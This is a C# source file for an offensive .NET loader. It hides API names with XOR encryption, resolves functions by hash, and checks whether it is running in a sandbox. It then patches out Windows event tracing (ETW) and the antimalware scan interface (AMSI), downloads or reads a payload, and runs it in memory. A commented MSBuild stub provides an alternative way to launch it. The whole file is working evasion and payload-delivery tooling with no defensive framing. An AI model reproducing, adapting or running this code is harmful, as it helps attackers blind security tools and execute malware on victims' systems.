using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Diagnostics;


/* Uncomment this when deploying from MSBuild payload

using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

   //This is for MSBuild later
  public class ClassExample : Task, ITask
  {
      public override bool Execute()
      {
          Conductor.Main(new string[] { });
          return true;
      }
  }
 */

public class Conductor
{
    private static bool _verbose = false;

    private static void Log(string msg)
    {
        if (_verbose) Console.WriteLine(msg);
    }

    // --- String decryption (XOR with rotating key) ---

    private static string Ds(byte[] enc, byte key)
    {
        byte[] buf = new byte[enc.Length];
        for (int i = 0; i < enc.Length; i++)
            buf[i] = (byte)(enc[i] ^ (byte)(key + i));
        return Encoding.ASCII.GetString(buf);
    }

    // Pre-encrypted strings (XOR key = 0x4B, rotating: byte[i] ^ (key + i))
    // "ntdll.dll"
    private static byte[] _s0 = new byte[] { 0x25, 0x38, 0x29, 0x22, 0x23, 0x7E, 0x35, 0x3E, 0x3F };
    // "kernel32.dll"
    private static byte[] _s1 = new byte[] { 0x20, 0x29, 0x3F, 0x20, 0x2A, 0x3C, 0x62, 0x60, 0x7D, 0x30, 0x39, 0x3A };
    // "EtwEventWrite"
    private static byte[] _s2 = new byte[] { 0x0E, 0x38, 0x3A, 0x0B, 0x39, 0x35, 0x3F, 0x26, 0x04, 0x26, 0x3C, 0x22, 0x32 };
    // "VirtualProtect"
    private static byte[] _s3 = new byte[] { 0x1D, 0x25, 0x3F, 0x3A, 0x3A, 0x31, 0x3D, 0x02, 0x21, 0x3B, 0x21, 0x33, 0x34, 0x2C };
    // "GetProcAddress"
    private static byte[] _s4 = new byte[] { 0x0C, 0x29, 0x39, 0x1E, 0x3D, 0x3F, 0x32, 0x13, 0x37, 0x30, 0x27, 0x33, 0x24, 0x2B };
    // "LoadLibraryA"
    private static byte[] _s5 = new byte[] { 0x07, 0x23, 0x2C, 0x2A, 0x03, 0x39, 0x33, 0x20, 0x32, 0x26, 0x2C, 0x17 };
    // "amsi.dll"
    private static byte[] _s6 = new byte[] { 0x2A, 0x21, 0x3E, 0x27, 0x61, 0x34, 0x3D, 0x3E };
    // "AmsiScanBuffer"
    private static byte[] _s7 = new byte[] { 0x0A, 0x21, 0x3E, 0x27, 0x1C, 0x33, 0x30, 0x3C, 0x11, 0x21, 0x33, 0x30, 0x32, 0x2A };

    // --- Hash-based export resolution (djb2) ---

    private static uint HashExport(string name)
    {
        uint h = 5381;
        foreach (char c in name)
            h = ((h << 5) + h) + (uint)c;
        return h;
    }

    public static IntPtr FindModuleBase(string dllName)
    {
        ProcessModuleCollection modules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule mod in modules)
        {
            if (mod.FileName.ToLower().EndsWith(dllName.ToLower()))
                return mod.BaseAddress;
        }
        return IntPtr.Zero;
    }

    public static IntPtr ResolveExportByHash(IntPtr moduleBase, uint targetHash)
    {
        IntPtr funcPtr = IntPtr.Zero;
        try
        {
            Int32 peHeader = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + 0x3C));
            Int64 optHeader = moduleBase.ToInt64() + peHeader + 0x18;
            Int16 magic = Marshal.ReadInt16((IntPtr)optHeader);
            Int64 pExport = (magic == 0x010b) ? optHeader + 0x60 : optHeader + 0x70;

            Int32 exportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 ordinalBase = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x10));
            Int32 numberOfNames = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x18));
            Int32 functionsRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x1C));
            Int32 namesRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x20));
            Int32 ordinalsRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x24));

            for (int i = 0; i < numberOfNames; i++)
            {
                string funcName = Marshal.PtrToStringAnsi((IntPtr)(moduleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + namesRVA + i * 4))));
                if (HashExport(funcName) == targetHash)
                {
                    Int32 funcOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRVA + i * 2)) + ordinalBase;
                    Int32 funcRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRVA + (4 * (funcOrdinal - ordinalBase))));
                    funcPtr = (IntPtr)((Int64)moduleBase + funcRVA);
                    break;
                }
            }
        }
        catch
        {
            throw new InvalidOperationException("Export resolution failed.");
        }

        if (funcPtr == IntPtr.Zero)
            throw new MissingMethodException("Target export not found (hash: 0x" + targetHash.ToString("X8") + ").");
        return funcPtr;
    }

    public static IntPtr ResolveExport(string dllName, string funcName)
    {
        IntPtr hModule = FindModuleBase(dllName);
        if (hModule == IntPtr.Zero)
            throw new DllNotFoundException(dllName + " not loaded.");
        return ResolveExportByHash(hModule, HashExport(funcName));
    }

    public static object InvokeNative(string dllName, string funcName, Type delegateType, ref object[] parameters)
    {
        IntPtr pFunc = ResolveExport(dllName, funcName);
        Delegate d = Marshal.GetDelegateForFunctionPointer(pFunc, delegateType);
        return d.DynamicInvoke(parameters);
    }

    private static byte[] Transform(byte[] data, string key)
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
        return result;
    }

    // --- Delegate types with non-descriptive parameter names ---

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr ResolveFunc(IntPtr hMod, string entry);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool MemGuard(IntPtr addr, UIntPtr sz, uint prot, out uint prev);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr ModLoad(string path);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr AllocSlot(IntPtr callback);

    private static object[] _invokeArgs = null;

    // --- Sandbox evasion ---

    private static bool CheckEnvironment()
    {
        // Non-emulated API check (FlsAlloc) — sandboxes that don't implement
        // fiber local storage will return IntPtr.Zero or throw
        try
        {
            string ntdll = Ds(_s0, 0x4B);
            string k32 = Ds(_s1, 0x4B);
            IntPtr hK32 = FindModuleBase(k32);
            if (hK32 == IntPtr.Zero) return false;

            IntPtr pFlsAlloc = IntPtr.Zero;
            try { pFlsAlloc = ResolveExportByHash(hK32, HashExport("FlsAlloc")); }
            catch { return false; }

            AllocSlot fFlsAlloc = (AllocSlot)Marshal.GetDelegateForFunctionPointer(pFlsAlloc, typeof(AllocSlot));
            IntPtr slotResult = fFlsAlloc(IntPtr.Zero);
            if (slotResult == IntPtr.Zero) return false;
        }
        catch
        {
            return false;
        }

        // Timing check — sleep and verify elapsed time to detect fast-forward sandboxes
        long ticksBefore = Environment.TickCount;
        Thread.Sleep(750);
        long ticksAfter = Environment.TickCount;
        if ((ticksAfter - ticksBefore) < 700)
            return false;

        return true;
    }

    // --- Patch bytes (encrypted at rest) ---

    // ETW patch: "ret" (x64: 0xC3) / "ret 0x14" (x86: 0xC2, 0x14, 0x00)
    // XOR encrypted with key 0x77
    private static byte[] GetTracePatch()
    {
        if (IntPtr.Size == 4)
            return new byte[] { (byte)(0xC2 ^ 0x77), (byte)(0x14 ^ 0x77), (byte)(0x00 ^ 0x77) };
        return new byte[] { (byte)(0xC3 ^ 0x77) };
    }

    private static byte[] DecryptPatch(byte[] enc)
    {
        byte[] dec = new byte[enc.Length];
        for (int i = 0; i < enc.Length; i++)
            dec[i] = (byte)(enc[i] ^ 0x77);
        return dec;
    }

    // AMSI patch: mov eax, 0x80070057; ret (x64) / + additional bytes (x86)
    // XOR encrypted with key 0x77
    private static byte[] GetScanPatch()
    {
        if (IntPtr.Size == 4)
            return new byte[] {
                (byte)(0xB8 ^ 0x77), (byte)(0x57 ^ 0x77), (byte)(0x00 ^ 0x77),
                (byte)(0x07 ^ 0x77), (byte)(0x80 ^ 0x77), (byte)(0xC2 ^ 0x77),
                (byte)(0x18 ^ 0x77), (byte)(0x00 ^ 0x77)
            };
        return new byte[] {
            (byte)(0xB8 ^ 0x77), (byte)(0x57 ^ 0x77), (byte)(0x00 ^ 0x77),
            (byte)(0x07 ^ 0x77), (byte)(0x80 ^ 0x77), (byte)(0xC3 ^ 0x77)
        };
    }

    // --- Core patching routines ---

    private static bool ApplyPatch(IntPtr target, byte[] encPatch)
    {
        string k32 = Ds(_s1, 0x4B);
        string vpName = Ds(_s3, 0x4B);
        IntPtr pVP = ResolveExport(k32, vpName);
        MemGuard fVP = (MemGuard)Marshal.GetDelegateForFunctionPointer(pVP, typeof(MemGuard));

        byte[] patch = DecryptPatch(encPatch);
        uint oldProtect;

        if (!fVP(target, (UIntPtr)patch.Length, 0x40, out oldProtect))
            return false;

        Marshal.Copy(patch, 0, target, patch.Length);

        // Restore original protection
        uint temp;
        fVP(target, (UIntPtr)patch.Length, oldProtect, out temp);

        return true;
    }

    private static void NeutralizeTelemetry()
    {
        string ntdll = Ds(_s0, 0x4B);
        string etwFunc = Ds(_s2, 0x4B);
        IntPtr pTarget = ResolveExport(ntdll, etwFunc);

        if (ApplyPatch(pTarget, GetTracePatch()))
            Log("[+] Telemetry neutralized");
        else
            Log("[!] Telemetry patch failed");
    }

    private static void NeutralizeScanner()
    {
        string k32 = Ds(_s1, 0x4B);
        string gpaName = Ds(_s4, 0x4B);
        string llName = Ds(_s5, 0x4B);
        string scanLib = Ds(_s6, 0x4B);
        string scanFunc = Ds(_s7, 0x4B);

        IntPtr pGPA = ResolveExport(k32, gpaName);
        IntPtr pLL = ResolveExport(k32, llName);

        ResolveFunc fGPA = (ResolveFunc)Marshal.GetDelegateForFunctionPointer(pGPA, typeof(ResolveFunc));
        ModLoad fLL = (ModLoad)Marshal.GetDelegateForFunctionPointer(pLL, typeof(ModLoad));

        IntPtr target = fGPA(fLL(scanLib), scanFunc);

        if (ApplyPatch(target, GetScanPatch()))
            Log("[+] Scanner neutralized");
        else
            Log("[!] Scanner patch failed");
    }

    // --- Payload loading ---

    private static Assembly LoadBinary(byte[] raw)
    {
        return Assembly.Load(raw);
    }

    private static byte[] ReadFile(string path)
    {
        byte[] buf = null;
        using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
        {
            buf = new byte[fs.Length];
            fs.Read(buf, 0, (int)fs.Length);
        }
        return buf;
    }

    private static byte[] Fetch(string url)
    {
        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
        req.Proxy.Credentials = CredentialCache.DefaultCredentials;
        req.Method = "GET";
        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
        WebResponse resp = req.GetResponse();
        MemoryStream ms = new MemoryStream();
        resp.GetResponseStream().CopyTo(ms);
        return ms.ToArray();
    }

    private static void Execute(byte[] data)
    {
        Assembly asm = LoadBinary(data);
        MethodInfo ep = asm.EntryPoint;
        ep.Invoke(null, _invokeArgs);
        Console.ReadLine();
    }

    private static void ExecuteEncrypted(byte[] data, string key)
    {
        Execute(Transform(data, key));
    }

    public static int ConfigureTLS(int proto)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)proto;
        return proto;
    }

    private static void Deploy(string target, string[] binaryArgs, bool encrypted, string key, int tlsProto)
    {
        ConfigureTLS(tlsProto);
        Log("[+] Target: " + target);
        _invokeArgs = new object[] { binaryArgs };

        byte[] data;
        if (target.ToLower().StartsWith("http"))
            data = Fetch(target);
        else
            data = ReadFile(target);

        if (encrypted)
            ExecuteEncrypted(data, key);
        else
            Execute(data);
    }

    private static void ShowUsage()
    {
        Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>] [-v]");
        Console.WriteLine("\t-b64   Base64 decode all subsequent parameters");
        Console.WriteLine("\t-xor   XOR decrypt the binary with the given key");
        Console.WriteLine("\t-path  Path or URL of the .NET binary to load");
        Console.WriteLine("\t-args  Arguments to pass to the loaded binary");
        Console.WriteLine("\t-v     Verbose output");
    }

    public static void Main(string[] args)
    {
        if (!CheckEnvironment())
            return;

        string payloadPath = "";
        string[] payloadArgs = new string[] { };
        bool base64Enc = false;
        bool xorEnc = false;
        string xorKey = "";
        int tlsProto = (Convert.ToInt32("384") * Convert.ToInt32("8"));

        if (args.Length == 0)
        {
            ShowUsage();
            return;
        }

        foreach (string arg in args)
        {
            if (arg.ToLower() == "-v" || arg.ToLower() == "--verbose")
            {
                _verbose = true;
            }

            if (arg.ToLower() == "--b64" || arg.ToLower() == "-b64")
            {
                base64Enc = true;
                Log("[+] Base64 mode enabled");
            }

            if (arg.ToLower() == "-xor" || arg.ToLower() == "--xor")
            {
                xorEnc = true;
                int idx = Array.IndexOf(args, arg) + 1;
                if (idx < args.Length)
                {
                    string raw = args[idx];
                    xorKey = base64Enc ? Encoding.UTF8.GetString(Convert.FromBase64String(raw)) : raw;
                }
                Log("[+] XOR decryption enabled");
            }

            if (arg.ToLower() == "-path" || arg.ToLower() == "--path")
            {
                int idx = Array.IndexOf(args, arg) + 1;
                if (idx < args.Length)
                {
                    string raw = args[idx];
                    payloadPath = base64Enc ? Encoding.UTF8.GetString(Convert.FromBase64String(raw)) : raw;
                }
            }

            if (arg.ToLower() == "-args" || arg.ToLower() == "--args")
            {
                int startIdx = Array.IndexOf(args, arg) + 1;
                int count = args.Length - startIdx;
                payloadArgs = new string[count];
                for (int i = 0; i < count; i++)
                {
                    string raw = args[startIdx + i];
                    payloadArgs[i] = base64Enc ? Encoding.UTF8.GetString(Convert.FromBase64String(raw)) : raw;
                }
            }
        }

        if (string.IsNullOrEmpty(payloadPath))
        {
            ShowUsage();
            return;
        }

        NeutralizeTelemetry();
        NeutralizeScanner();
        Deploy(payloadPath, payloadArgs, xorEnc, xorKey, tlsProto);
    }
}
